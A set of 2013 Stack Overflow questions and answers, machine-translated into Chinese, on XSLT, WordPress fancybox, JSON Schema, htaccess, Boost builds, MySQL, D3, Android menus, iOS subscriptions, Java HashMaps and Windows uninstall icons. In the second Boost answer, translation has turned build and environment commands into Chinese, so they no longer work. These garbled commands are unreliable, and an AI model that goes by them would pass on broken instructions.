# xml - xslt 用于在 xml 中为我的属性名称添加前缀

> ID：16204865
> 
> 赞同：1
> 
> 时间：2013-04-25T01:16:54.263
> 
> 标签：xml, xslt

我有一个这种格式的 xml 文档。

```
<SampleXMLFormat>
<Header>
<Id>123</Id>
</header>
<Properties>
<property name= "type" value = "a1">
<property name="prop1" value="val1"/>
<property name="prop2" value="val2"/>
</Properties>
<Properties>
<property name= "type" value = "a2">
<property name="prop1" value="val1"/>
<property name="prop2" value="val2"/>
</Properties>
</SampleXMLFormat> 
```

我无法编写将我的 xml 文档转换为类似的 xslt 转换

```
<SampleXMLFormat>
<Header>
<Id>123</Id>
</Header>
<Properties>
<property name="a1_prop1" value="val1"/>
<property name="a1_prop2" value="val2"/>
<property name="a2_prop1" value="val1"/>
<property name="a2_prop2" value="val2"/>
</Properties>
</SampleXMLFormat> 
```

请问我可以得到一些帮助吗？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-04-25T02:25:48.173

**这种转变**：

```
<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
 <xsl:output omit-xml-declaration="yes" indent="yes"/>
 <xsl:strip-space elements="*"/>

 <xsl:template match="/*">
  <SampleXMLFormat>
    <xsl:copy-of select="Header"/>
    <Properties>
     <xsl:apply-templates/>
    </Properties>
  </SampleXMLFormat>
 </xsl:template>

 <xsl:template match="property[not(@name='type')]">
  <property name="{../property[@name='type']/@value}_{@name}" value="{@value}"/>
 </xsl:template>
 <xsl:template match="text()"/>
</xsl:stylesheet> 
```

**应用于提供的 XML 文档时：**

```
<SampleXMLFormat>
  <Header>
    <Id>123</Id>
  </Header>
  <Properties>
    <property name= "type" value = "a1"/>
    <property name="prop1" value="val1"/>
    <property name="prop2" value="val2"/>
  </Properties>
  <Properties>
    <property name= "type" value = "a2"/>
    <property name="prop1" value="val1"/>
    <property name="prop2" value="val2"/>
  </Properties>
</SampleXMLFormat> 
```

**产生想要的正确结果：**

```
<SampleXMLFormat>
   <Header>
      <Id>123</Id>
   </Header>
   <Properties>
      <property name="a1_prop1" value="val1"/>
      <property name="a1_prop2" value="val2"/>
      <property name="a2_prop1" value="val1"/>
      <property name="a2_prop2" value="val2"/>
   </Properties>
</SampleXMLFormat> 
```

**说明**：

正确使用：

1.  **[模板匹配模式](http://www.w3.org/TR/xslt#patterns)**。

2.  **[AVT](http://www.w3.org/TR/xslt#attribute-value-templates)**（属性值模板）。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-04-25T01:26:24.213

您的 XML 格式不正确，但假设这是您的意思（请注意终止的“类型”属性）：

```
<SampleXMLFormat>
  <Properties>
    <property name= "type" value = "a1"/>
    <property name="prop1" value="val1"/>
    <property name="prop2" value="val2"/>
  </Properties>
  <Properties>
    <property name= "type" value = "a2"/>
    <property name="prop1" value="val1"/>
    <property name="prop2" value="val2"/>
  </Properties>
</SampleXMLFormat> 
```

那么这个 XSLT 应该可以解决问题：

```
<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
  <xsl:output method="xml" indent="yes" omit-xml-declaration="yes"/>

  <xsl:template match="@* | node()">
    <xsl:copy>
      <xsl:apply-templates select="@* | node()"/>
    </xsl:copy>
  </xsl:template>

  <xsl:template match="/*">
    <xsl:copy>
      <Properties>
        <xsl:apply-templates
          select="Properties/*[not(self::property and 
                                   @name = 'type')]" />
      </Properties>
    </xsl:copy>
  </xsl:template>

  <xsl:template match="property/@name">
    <xsl:attribute name="name">
      <xsl:value-of 
        select="concat(../../property[@name = 'type']/@value, '_', .)"/>
    </xsl:attribute>
  </xsl:template>
</xsl:stylesheet> 
```

在上述输入上运行时，结果为：

```
<SampleXMLFormat>
  <Properties>
    <property name="a1_prop1" value="val1" />
    <property name="a1_prop2" value="val2" />
    <property name="a2_prop1" value="val1" />
    <property name="a2_prop2" value="val2" />
  </Properties>
</SampleXMLFormat> 
```

# wordpress - 无法加载fancybox

> ID：16204870
> 
> 赞同：2
> 
> 时间：2013-04-25T01:17:52.700
> 
> 标签：wordpress, fancybox

我要疯了，想弄清楚这一点。在 wordpress 中，加载了 easy fancybox 插件以加载所有必要的文件，但我什么也做不了。我尝试过画廊、单张图片、iframe。

我没有看到与其他插件的任何冲突，只有一个 jquery 版本正在加载。

我基本上从一切正常加载的网站上复制了代码：http: [//www.familypet.com/photos/](http://www.familypet.com/photos/)

这是当前未加载的： http: [//testwp.familypet.com/photo-gallery/](http://testwp.familypet.com/photo-gallery/)

任何帮助，将不胜感激

谢谢

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-25T07:01:01.833

在[http://testwp.familypet.com/photo-gallery/](http://testwp.familypet.com/photo-gallery/)网站上，您缺少**iframe javascript 代码**，但您使用的是**fancybox-iframe 类**。

[http://www.familypet.com/photos/](http://www.familypet.com/photos/)中没有缺少该代码

尝试将此代码添加到 testwp 站点并将其放在`/* Auto-click */`注释上方（第 151 行）：

```
/* iFrame */
$('a.fancybox-iframe, li.fancybox-iframe a, area.fancybox-iframe, li.fancybox-iframe a').fancybox( $.extend({}, fb_opts, { 'type' : 'iframe', 'width' : 950, 'height' : 550, 'padding' : 0, 'scrolling' : 'auto', 'autoScale' : false, 'titleShow' : true, 'titlePosition' : 'inside', 'titleFromAlt' : true }) ); 
```

# json - JSON Schema中的“必需”与“可选”有什么区别

> ID：16204871
> 
> 赞同：46
> 
> 时间：2013-04-25T01:18:10.203
> 
> 标签：json, jsonschema

有时，我注意到以下 JSON 模式：

```
{
    "type": "object",   
    "properties": {
        "address": {
                   "type": "string",
                   "required": true
            }
     }

} 
```

对比

```
{
    "type": "object",   
    "properties": {
        "address": {
                   "type": "string",
                   "optional": false
            }
     }

} 
```

那么上面例子中的`required`vs有什么区别呢？`optional`

* * *

## 回答 #1

> 赞同：40
> 
> 时间：2014-01-06T12:06:24.720

JSON 模式的[IETF 草案 v4](http://json-schema.org/documentation.html)仅定义`required`而不包括`optional`.

引用草案 v4中的[部分](http://json-schema.org/latest/json-schema-validation.html#anchor61)`required`：

> **有效值：**这个关键字的值必须是一个数组。这个数组必须至少有一个元素。此数组的元素必须是字符串，并且必须是唯一的。
> 
> **成功验证的条件：**如果对象实例的属性集包含此关键字数组值中的所有元素，则该对象实例对该关键字有效。

实际上， using`required`使得名称未包含在给定字符串数组中的所有属性都是可选的。

* * *

## 回答 #2

> 赞同：24
> 
> 时间：2013-10-24T11:35:34.253

实际上，它们是等价的表达方式，只是使用了不同版本的标准。

`optional`来自 v2，`required`来自 v3。您应该确保为您的工具使用正确的工具（尽管理想情况下，如果可以的话，您应该迁移到 v4）。

* * *

## 回答 #3

> 赞同：3
> 
> 时间：2013-04-25T01:29:11.430

这意味着对象的属性必须具有非`undefined`值`address`(if `required`)。

# apache - 如何使用 htaccess 检测 google、bing、yahoo 爬虫

> ID：16204873
> 
> 赞同：0
> 
> 时间：2013-04-25T01:18:39.903
> 
> 标签：apache, .htaccess, mod-rewrite

我试图阻止谷歌、必应、雅虎爬虫被重写，我怎样才能检测到它们？
这似乎不起作用：

```
RewriteCond %{HTTP_USER_AGENT} !(googlebot|bingbot|yahoo)    [NC]    
RewriteCond %{REQUEST_URI} !(^|&)images(&|$)
RewriteRule ^images/(.*)$ http://www.mydomain.com/script.php?e=$1 [NC,R] 
```

我相信 googlebot 是大写的（Googlebot），这有什么不同吗？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-25T01:33:24.350

`RewriteCond`看起来不错。大写无关紧要，因为您使用`NC`(nocase) 标志。问题可能与第二个有关`RewriteCond`。

您可以停止为 Google 和 co 进行的所有重写。一开始有这个规则

```
RewriteCond %{HTTP_USER_AGENT} (googlebot|bingbot|yahoo) [NC]
RewriteRule ^ - [L] 
```

如果用户代理字符串是提到的爬虫之一，这将忽略所有后续规则。

# c++ - Boost 1.53.0 - 构建 VC++11 时出现 LNK1104 错误

> ID：16204875
> 
> 赞同：1
> 
> 时间：2013-04-25T01:18:46.827
> 
> 标签：c++, boost, visual-studio-2012, linker

我第一次尝试构建 boost v. 1.53 并收到此错误消息：

错误 1 ​​错误 LNK1104: 无法打开文件 'libboost_date_time-vc110-mt-gd-1_53.lib' C:\Users\ryant_000\documents\visual studio 2012\Projects\Phase 2\Phase 2\LINK Phase 2

我的包含目录中有 C:....\boost_1_53_0，在链接器菜单上的附加依赖项中有 C:...\boost_1_53_0\stage\lib。

搜索文档后我找不到要链接的文件是什么？

非常感谢。

* * *

## 回答 #1

> 赞同：8
> 
> 时间：2013-04-25T16:46:49.817

尽管它很可爱并且声称它是一个仅包含标题的集合，但 boost 确实有一些部分需要内置到库中以便您使用它们。这些库之一是`date_time`. Boost 在某种意义上是友好的，它会根据您的编译器选项`.lib`在您创建库时自动为您链接正确的文件。`#include`需要注意的是，您需要先构建库。

您缺少的文件是`libboost_date_time-vc110-mt-gd-1_53.lib`，我们可以从[命名约定](http://www.boost.org/doc/libs/1_42_0/more/getting_started/windows.html#library-naming)中看到，它是使用调试运行时的多线程调试版本，用于 VC11（对您和我来说是 Visual C++ 2012）。有可能您根本没有构建特定版本的库 - 默认情况下，boost 执行*最小*构建，跳过多个版本的库。虽然这需要一些时间，但我发现在 boost 中构建*所有东西*是件好事……嘿，硬盘空间很便宜！

打开 Visual Studio 命令提示符，然后进入 boost 目录：

```
C:\> cd boost_1_53_0
C:\boost_1_53_0\> bootstrap.bat vc11
C:\boost_1_53_0\> .\b2 --build-type=complete toolset=vc11
... now go and make yourself a cup of tea 
```

这将需要一些时间，但它应该构建每个库的所有组合。例如，您可以在多核机器上通过添加`-j4`到`.\b2`命令行来加快它的速度，这将一次构建四个东西。

该`vc11`部分定义了要使用的工具集，如果你有两个编译器，这很方便——理论上它不应该是必需的（boost 可以很好地找到正确的工具集），但确保它并没有什么坏处。

如果您想测试这是问题所在，那么您可以指定只构建缺少的 date_time 库的所有组合：

```
C:\boost_1_53_0\> .\b2 --build-type=complete toolset=vc11 --with-date_time
... now go and make yourself a cold drink, this won't take so long 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-10-23T06:59:03.083

更改boost文件夹中以下文件的内容（下载并解压）

文件夹：boost_1_54_0\tools\build\v2\tools 文件：1\. msvc.jam

内容改变：

对于 32 位：toolset.flags msvc LINKFLAGS 控制台：/subsystem:console,5.01；

对于 64 位：toolset.flags msvc LINKFLAGS 控制台：/subsystem:console,5.02；

1.  msvc.pycontent 更改：对于 32 位：toolset.flags('msvc', 'LINKFLAGS', ['console'], ['/subsystem:console,5.01'])

对于 64 位：toolset.flags('msvc', 'LINKFLAGS', ['console'], ['/subsystem:console,5.02']) 文件夹：boost_1_54_0\tools\build\v2\engine 文件：1\. 构建。 bat 内容更改：对于 32 位/ 64 位：1\. 完全修复 Visual Studio 路径，而不是“%ProgramFiles%-更改为 %ProgramFiles(x86)%

```
 2\.   Add " /D _USING_V110_SDK71_ " to BOOST_JAM_CC =cl command before Skip_VC11Open vs2012 developer Command prompt and type the following commands 
```

** 根据您的安装更新 7.1A SDK 路径

调用“%ProgramFiles(x86)%\Microsoft Visual Studio 11.0\VC\bin\vcvars32.bat”

设置 INCLUDE=%ProgramFiles(x86)%\Microsoft SDKs\Windows\7.1A\Include;%INCLUDE%

设置 PATH=%ProgramFiles(x86)%\Microsoft SDKs\Windows\7.1A\Bin;%PATH%

设置 LIB=%ProgramFiles(x86)%\Microsoft SDKs\Windows\7.1A\Lib;%LIB%

引导程序

根据操作系统类型（32/64 位）选择命令

对于 32 位：

b2 工具集=msvc-11.0 变体=调试，发布链接=共享运行时链接=共享地址模型=32

对于 64 位：

b2 工具集=msvc-11.0 变体=调试，发布链接=共享运行时链接=共享地址模型=64

要为发布和调试版本编译任何示例，请执行以下操作：

打开 vs2012 开发者命令提示符，输入以下命令

调用“%ProgramFiles(x86)%\Microsoft Visual Studio 11.0\VC\bin\vcvars32.bat”

设置 INCLUDE=%ProgramFiles(x86)%\Microsoft SDKs\Windows\7.1A\Include;%INCLUDE%

设置 PATH=%ProgramFiles(x86)%\Microsoft SDKs\Windows\7.1A\Bin;%PATH%

设置 LIB=%ProgramFiles(x86)%\Microsoft SDKs\Windows\7.1A\Lib;%LIB%

转到示例目录：例如：boost_1_54_0\libs\test\tools\console_test_runner

键入以下命令

\boost_1_54_0\bjam.exe --v2 工具集=msvc-11.0 变体=调试，发布链接=共享线程=多运行时链接=共享

# php - mysql 计数正在计算所有记录，而不是使用 IN 语句过滤计数

> ID：16204880
> 
> 赞同：0
> 
> 时间：2013-04-25T01:19:10.820
> 
> 标签：php, mysql

我只是摆弄一些 sql 并试图获得所需的结果，但我并没有完全得到我想要的。我有一个 products 表和一个 product_filters 表，它们有关系，product_filters 表与 filter_values 表相关。在我的 sql 示例中，它打印出结果，但我似乎不能只计算顶层的产品数量，它打印出 3 而不是 2

这是[结果集的示例，这是](http://sqlfiddle.com/#!2/e9125/81)[计数](http://sqlfiddle.com/#!2/e9125/82) 的示例

所以我想要的是获得 2 个产品的准确计数

```
SELECT COUNT(*)
FROM 
    (SELECT x.product_id,x.department_id,x.title, pi.image_medium
        FROM products x      
        INNER JOIN product_images pi on pi.product_id = x.product_id
     WHERE x.department_id = 3
    )p
INNER JOIN product_filters pf on pf.product_id = p.product_id
LEFT JOIN filters f on f.filter_id = pf.filter_id
RIGHT JOIN filter_values fv on fv.filter_value_id = pf.filter_value_id
WHERE p.department_id = 3  AND pf.filter_value_id IN(1,3) 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-25T01:37:02.207

更改`SELECT COUNT(*)`为`SELECT COUNT(DISTINCT p.product_id)`

如果您想查看正在计算的结果集，请替换`COUNT(*)`为`*`. 这导致三星平板电脑 2 有 2 行，因为它有两`product_filters`行与`WHERE`子句匹配。

# javascript - D3.js - 更新 svg 路径的标题

> ID：16204883
> 
> 赞同：2
> 
> 时间：2013-04-25T01:19:31.450
> 
> 标签：javascript, svg, d3.js

我有一个 d3 饼图，当我通过选择更新路径值时，我无法弄清楚如何更新附加到各个路径的一些 SVG 标题。

我的代码的精简版本如下。

我一直在尝试不同的代码片段，尤其是在函数 change() 中，但还没有找到它的诀窍。我也没有找到任何已经发布的好例子。

同样，我使用路径标题标签作为工具提示，并在更新路径值时尝试更新它们的文本值。

非常感谢任何帮助，因为我在本周末完成这个项目的最后期限。

再次非常感谢。

```
var dataset = {
Y2012:  [1000, 2000, 3000],
Y2011:  [3000, 2000, 1000],
//etc.
};

var width = 300,
    height = 300,
    radius = Math.min(width, height) / 2;

var pie = d3.layout.pie()
    .sort(null);

var arc = d3.svg.arc()
    .innerRadius(outer_radius - 85)
    .outerRadius(outer_radius - 50);

var svg = d3.select(".svg_container").append("svg")
    .attr("width", width)
    .attr("height", height)
  .append("g")
    .attr("transform", "translate(" + width / 2 + "," + height / 2 + ")");

var path = svg.selectAll("path")
    .data(pie(dataset.Y2012))
  .enter().append("path")
    .attr("fill", function(d, i) { return color(i); })
    .attr("d", outer_arc)
    .each(function(d) { this._current = d; });

var tooltips= d3.selectAll("path")
  .append("title")
    .classed("tooltip", true)
    .text(function(d) { return d.value });

d3.selectAll("#select_year").on("change", change);

function change() {
  path = path.data(pie(dataset[this.value])); // update the data
  path.transition().duration(750).attrTween("d", arcPathTween);
}

function arcPathTween(a) {
  var i = d3.interpolate(this._current, a);
  this._current = i(0);
  return function(t) {
    return arc(i(t));
  };
} 
```

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-04-25T06:00:56.480

问题是您没有更新`function change()`. 即使您的标题文本是由访问数据的函数创建的，您也必须意识到，当您更新数据时，该函数不会自动再次执行。这必须手动完成：

```
function change(newYear) {
    path = path.data(pie(dataset[newYear])); // update the data
    path.transition().duration(750).attrTween("d", arcPathTween);
    path.select("title").text(function(d) { return d.value });
} 
```

我还创建了一个[小提琴](http://jsfiddle.net/8Rqz6/)来说明解决方案。

如果你想避免代码重复（你应该这样做），你可以使用[一般更新模式](http://bl.ocks.org/mbostock/3808218)，这意味着你在同一个函数中进行初始化和更新。

# php - 如何在highcharts中使用javascript在新创建的文本文件中添加csv文件的数据

> ID：16204884
> 
> 赞同：0
> 
> 时间：2013-04-25T01:19:42.480
> 
> 标签：php, javascript, file, csv, highcharts

我正在从 csv 文件中获取数据，并且正在绘制它的折线图。现在我想创建一个新的文本文件，并将 csv 文件的数据放在那个新的文本文件中，它应该有逗号分隔的值。就像如果 csv 文件中有这个内容 1,1,2,3,4,5 那么新的文本文件也应该有这个东西，但它必须是一个扩展名为 .txt 的文件。

我该怎么做？

```
$.get('testFile.csv', function(data) {
// Split the lines
var lines = data.split('\n');
$.each(lines, function(lineNo, line) {
var items = line.split(',');
var series = {
data: []
};
$.each(items, function(itemNo, item) {
series.data.push(parseFloat(item));
});
options.series.push(series);
var chart = new Highcharts.Chart(options);
function downloadWithName(uri, name) {
function eventFire(el, etype){
if (el.fireEvent) {
(el.fireEvent('on' + etype));
} else {
var evObj = document.createEvent('Events');                                                                          

evObj.initEvent(etype, true, false);                                                                                

el.dispatchEvent(evObj);
}
}
var link = document.createElement("a");
link.download = name;
link.href = uri;
eventFire(link, "click");
}
downloadWithName("data:,options", "newtestFile.txt") 
```

# android - 操作栏可点击按钮 MIA

> ID：16204885
> 
> 赞同：0
> 
> 时间：2013-04-25T01:19:43.317
> 
> 标签：android, android-layout

这是一个带有可点击按钮的操作栏示例，我尝试将其应用于其他活动，但我未能成功他的代码非常简单，但我看不出他是如何做到的，这是我谈论的示例[http://www.brucephillips。名称/博客](http://www.brucephillips.name/blog/index.cfm/2011/12/28/Android-App-Development--Using-The-ActionBar-Widget)/index.cfm/2011/12/28/Android-App-Development--Using-The-ActionBar-Widget 有人知道他是怎么做到的吗？当我尝试它时，动作栏不见了。这是他在java中的代码

```
package name.brucephillips.actionbarexample;

import android.app.Activity;
import android.os.Bundle;
import android.view.Menu;
import android.view.MenuInflater;
import android.view.MenuItem;
import android.widget.Toast;

public class ActionBarExampleActivity extends Activity {
    /** Called when the activity is first created. */
    @Override
    public void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.main);
    }

    @Override
    public boolean onCreateOptionsMenu(Menu menu) {
        MenuInflater inflater = getMenuInflater();
        inflater.inflate(R.menu.mainmenu, menu);
        return true;
    }

    @Override
    public boolean onOptionsItemSelected(MenuItem item) {
        Toast.makeText(this, "MenuItem " + item.getTitle() + " selected.", Toast.LENGTH_SHORT).show();
        return true;
    }
} 
```

这是他的主菜单

```
<menu xmlns:android="http://schemas.android.com/apk/res/android" >

    <item android:id="@+id/open" android:showAsAction="ifRoom|withText" android:title="Open" android:icon="@drawable/ic_action_open"></item>
    <item android:id="@+id/save" android:showAsAction="ifRoom|withText" android:title="Save" android:icon="@drawable/ic_action_save"></item>
    <item android:id="@+id/close" android:showAsAction="ifRoom|withText" android:title="Close" android:icon="@drawable/ic_action_close"></item>
    <item android:id="@+id/history" android:showAsAction="ifRoom|withText" android:title="History" android:icon="@drawable/ic_action_history"></item>
    <item android:id="@+id/settings" android:showAsAction="ifRoom|withText" android:title="Settings" android:icon="@drawable/ic_action_settings"></item>

</menu> 
```

这是他的主要活动

```
<?xml version="1.0" encoding="utf-8"?>
<LinearLayout xmlns:android="http://schemas.android.com/apk/res/android"
    android:layout_width="fill_parent"
    android:layout_height="fill_parent"
    android:orientation="vertical" >

<TextView xmlns:android="http://schemas.android.com/apk/res/android"
  android:id="@+id/textview"
  android:layout_width="fill_parent"
  android:layout_height="fill_parent"
  android:text="@string/introduction"/>

</LinearLayout> 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-25T04:08:18.173

试试这个可能是您的设备没有适当的密度来显示菜单。

```
 android:uiOptions="splitActionBarWhenNarrow" 
```

把它放在清单中的活动标签中。

**更新：-**

菜单的完整代码按原样放置此代码....

```
import android.app.Activity;
import android.os.Bundle;
import android.view.Menu;
import android.view.MenuInflater;
import android.view.MenuItem;
import android.widget.Toast;

public class AndroidMenusActivity extends Activity {
    @Override
    public void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.main);
    }

    // Initiating Menu XML file (menu.xml)
    @Override
    public boolean onCreateOptionsMenu(Menu menu)
    {
        MenuInflater menuInflater = getMenuInflater();
        menuInflater.inflate(R.menu.menu,menu);
        MenuItem item = menu.getItem(0);
        String itemTitle = item.getTitle().toString();
        Toast.makeText(this, "First menu item is: " + itemTitle, Toast.LENGTH_LONG).show();

        return true;
    }

    @Override
    public boolean onOptionsItemSelected(MenuItem item)
    {

        switch (item.getItemId())
        {
        case R.id.menu_bookmark:

            Toast.makeText(this, "Bookmark is Selected",
                    Toast.LENGTH_SHORT).show();
            return true;

        case R.id.menu_save:
            Toast.makeText(this, "Save is Selected", 
                    Toast.LENGTH_SHORT).show();
            return true;

        case R.id.menu_search:
            Toast.makeText(this, "Search is Selected",
                    Toast.LENGTH_SHORT).show();
            return true;

        case R.id.menu_share:
            Toast.makeText(this, "Share is Selected", 
                    Toast.LENGTH_SHORT).show();
            return true;

        case R.id.menu_delete:
            Toast.makeText(this, "Delete is Selected",
                    Toast.LENGTH_SHORT).show();
            return true;

        default:
            return false;
        }
    }    

} 
```

//main.xml

```
<?xml version="1.0" encoding="utf-8"?>
<LinearLayout xmlns:android="http://schemas.android.com/apk/res/android"
    android:layout_width="fill_parent"
    android:layout_height="fill_parent"
    android:orientation="vertical" >

    <TextView
        android:layout_width="wrap_content"
        android:layout_height="wrap_content"
        android:text="hello" />

</LinearLayout> 
```

//menu.xml 它应该在 res 内的 menu 文件夹中

```
<?xml version="1.0" encoding="utf-8"?>
<menu xmlns:android="http://schemas.android.com/apk/res/android" >

    <item
        android:id="@+id/menu_bookmark"
        android:showAsAction="ifRoom"
        android:title="mark"/>
    <item
        android:id="@+id/menu_save"
        android:showAsAction="ifRoom|withText"
        android:title="Save"/>
    <item
        android:id="@+id/menu_search"
        android:showAsAction="ifRoom"
        android:title="Search"/>
    <item
        android:id="@+id/menu_share"
        android:showAsAction="ifRoom"
        android:title="Share"/>
    <item
        android:id="@+id/menu_delete"
        android:showAsAction="ifRoom"
        android:title="Delete"/>

</menu> 
```

//显现

像这样把 uiOption 放在活动中

```
<activity
            android:name=".AndroidMenusActivity"
            android:label="@string/app_name"
            android:uiOptions="splitActionBarWhenNarrow" > 
```

# ios - IAP 自动续订的持续时间

> ID：16204886
> 
> 赞同：1
> 
> 时间：2013-04-25T01:19:49.403
> 
> 标签：ios, xcode, duration, in-app-purchase, auto-renewing

我如何知道购买日期和到期日期之间自动续订订阅的持续时间。

例如，如果用户在 1 月 31 日通过自动更新购买了 1 个月的产品，那么到期日是什么时候？（2 月 28 日？……如果闰年？）

谢谢你。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-05-01T03:23:47.283

请参阅[自动续订：一个月有多长？</a>。](https://stackoverflow.com/questions/15411408/auto-renewable-subscriptions-how-long-a-month-is)

 [如果您仍然好奇，您可以通过检查`expires_date`字段来确认，该`receipt`字段位于 JSON 对象的字段中，该字段包含来自收据的解析信息（在生产环境中，而不是沙箱环境中）。更多信息：](https://stackoverflow.com/questions/15411408/auto-renewable-subscriptions-how-long-a-month-is) 

[https://developer.apple.com/library/ios/#documentation/NetworkingInternet/Conceptual/StoreKitGuide/RenewableSubscriptions/RenewableSubscriptions.html](https://developer.apple.com/library/ios/#documentation/NetworkingInternet/Conceptual/StoreKitGuide/RenewableSubscriptions/RenewableSubscriptions.html)

# java - Java Hashmaps 单词分组不会返回多个 ArrayList

> ID：16204887
> 
> 赞同：0
> 
> 时间：2013-04-25T01:20:04.220
> 
> 标签：java, arraylist, hashmap

对于家庭作业，我必须创建一个可以在刽子手处作弊的程序。为了做到这一点，我需要想出一种通过单词字母位置将单词分组到家庭的方法。因此，例如，如果单词长度为 4，并且他们猜测“e”，那么“- - - e”的所有单词都将位于哈希图的 Arraylist 之一中，该模式作为键，所有“- e - -" 将在另一个相同的 hashmap 的 ArrayLists 中，以模式作为键。我的问题是，尽管我的程序能够识别模式。它仍然返回一个空集或一个包含所有单词的 ArrayList。一个多小时以来，我一直在尝试不同的事情，但我似乎无法让它们正确分组。任何帮助是极大的赞赏。

```
import java.util.ArrayList;
import java.lang.StringBuilder;
import java.util.HashMap;

public class EvilEngine 
{
HashMap<StringBuilder, ArrayList> families = new HashMap<StringBuilder, ArrayList>();
int k = 0;
ArrayList<String> currentList = new ArrayList();
StringBuilder blankPattern = new StringBuilder("");
StringBuilder newPattern = new StringBuilder("");

public void PatternMatcher(ArrayList wordlist, char guess, Integer wordlength)
{

    String word;
    int j = 0;
    int x = 0;
    int biggest = 0;
    StringBuilder longest = null;    

    while(x < wordlist.size())
    {
        int i = 0;
        int index = 0;
        for (i=0; i < wordlength; i++)
        {
            blankPattern = blankPattern.append("-");
        }
        boolean boo = false;
        newPattern = blankPattern;
        word = (String) wordlist.get(x);
        index = word.indexOf(guess);
        while (index >= 0) 
        {
            blankPattern.setCharAt(index, guess);
            newPattern = blankPattern;
            index = word.indexOf(guess, index + 1);
        }
        this.PatternCompiler(word,newPattern);
        blankPattern = blankPattern.delete(0,wordlength);
        x++;
    }
}
public void PatternCompiler (String word, StringBuilder pattern)
{
        if(!families.containsKey(pattern))
        {
            ArrayList<String> newPatternList = new ArrayList();
            newPatternList.add(word);
            families.put(pattern, newPatternList);
        }
        if (families.containsKey(pattern))
        {
            ArrayList<String> oldPatternList = new ArrayList();
            oldPatternList = families.get(pattern);
            oldPatternList.add(word);
            families.put(pattern, oldPatternList);
        }
        else {
            System.out.println("Error");
        }

}
public HashMap<StringBuilder, ArrayList> returnFamilies (){
    return families;
}
} 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-25T05:57:38.597

虽然您的代码有几个或多或少的小问题，但我怀疑主要问题是您`HashMap`的键是 type`StringBuilder`而不是`String`. `HashMap`使用[`hashCode()`](http://docs.oracle.com/javase/1.5.0/docs/api/java/lang/Object.html#hashCode%28%29)关键对象的功能来确定它是否已经在地图中。对于 a `StringBuilder`，哈希值可能只是对象的地址（使用从`Object`类继承的实现）。

由于`newPattern`是一个范围在函数之外的类级变量，当你将它传递给`PatternCompiler()`函数时，参数`pattern`只是对*同一个*类级对象的*引用（即，将具有相同的哈希码）。*而且这个对象（也不是它的哈希码）在你的代码中永远不会改变，因为它也是在类级别声明的，当你改变 的*值*时，你永远不会改变它所引用的对象。因此，每次通过循环重新分配它不会改变任何东西（并且基本上是混乱的）。*`blankPattern`*`blankPattern``newPattern``while`**

 **要解决此问题，您需要将密钥类型`HashMap`设为 be`String`而不是`StringBuilder`. 该类`String`定义了一个[`hashCode()`](http://docs.oracle.com/javase/1.5.0/docs/api/java/lang/String.html#hashCode%28%29)函数，该函数将根据字符串的实际内容（而不仅仅是对象的地址，如`StringBuilder`）返回不同的代码。（另外，如前所述，没有理由`blankPattern`在类级别而不是在`PatternMatcher()`函数内部声明，而且您根本不需要`newPattern`。）

虽然这是您的代码的主要问题，但另一个相当大的问题与您函数`if`中的第二个条件有关。`PatternCompiler()`在上一个`if`块中，如果该模式还没有一个新的 ArrayList 到族中，则将其添加到族中。所以无论如何，此时第二个`if`条件 ( `if (families.containsKey(pattern))`) 将是正确的。因为这两个块都添加`word`到 列表中`families`，所以某些单词可能会被添加两次。

祝你好运！**

# c# - 如何更改“添加或删除程序”中的图标

> ID：16204889
> 
> 赞同：17
> 
> 时间：2013-04-25T01:20:21.860
> 
> 标签：c#, winforms, icons

![在此处输入图像描述](https://i.imgur.com/xpOdqtw.png)

我正在尝试将*添加或删除程序*中的图标设置为与我的应用程序图标相同。我的图标存储在我的解决方案的应用程序文件夹中。我在[SourceForge 上](http://en.wikipedia.org/wiki/SourceForge)阅读过，您必须编辑 ARPPRODUCTICON 属性。在 Windows 窗体中如何/在哪里执行此操作？

* * *

## 回答 #1

> 赞同：44
> 
> 时间：2013-04-28T03:43:02.563

我找到了一个非常简单的解决方案。在部署项目的属性下，单击“AddRemoveProgram”并浏览您的文件。我建议将您的应用程序图标放在您的应用程序文件夹中。

![在此处输入图像描述](https://i.imgur.com/DDgi7v5.png)

* * *

## 回答 #2

> 赞同：9
> 
> 时间：2013-04-25T02:32:54.490

您可以在下面手动更改这些详细信息

**`HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall`**

一些有效的可接受的键值：

*   InstallLocation (string) - 安装目录 ($INSTDIR)
*   DisplayIcon (string) - 将在您的应用程序名称旁边显示的图标的路径、文件名和索引
*   Publisher (string) - (Company) 发布者的名称
*   ModifyPath (string) - 应用程序修改程序的路径和文件名
*   InstallSource（字符串）- 安装应用程序的位置
*   ProductID（字符串）- 应用程序的产品 ID
*   自述文件（字符串）- 自述文件信息的路径（文件或 URL）
*   RegOwner (string) - 应用程序的注册所有者
*   RegCompany (string) - 应用程序的注册公司
*   HelpLink（字符串）- 到支持网站的链接
*   HelpTelephone (string) - 支持电话号码
*   URLUpdateInfo (string) - 链接到应用程序更新的网站
*   URLInfoAbout (string) - 链接到应用程序主页
*   DisplayVersion (string) - 应用程序的显示版本
*   VersionMajor (DWORD) - 应用程序的主要版本号
*   VersionMinor (DWORD) - 应用程序的次要版本号
*   NoModify (DWORD) - 如果卸载程序没有选项来修改已安装的应用程序，则为 1
*   NoRepair (DWORD) - 如果卸载程序没有修复安装的选项，则为 1
*   SystemComponent (DWORD) - 设置 1 以防止应用程序显示在控制面板中添加/删除程序的程序列表中。
*   EstimatedSize (DWORD) - 已安装文件的大小（以 KB 为单位）
*   注释（字符串）- 描述安装程序包的注释

如果 NoModify 和 NoRepair 都设置为 1，则按钮显示“删除”而不是“修改/删除”。

例如：

```
Windows Registry Editor Version 5.00

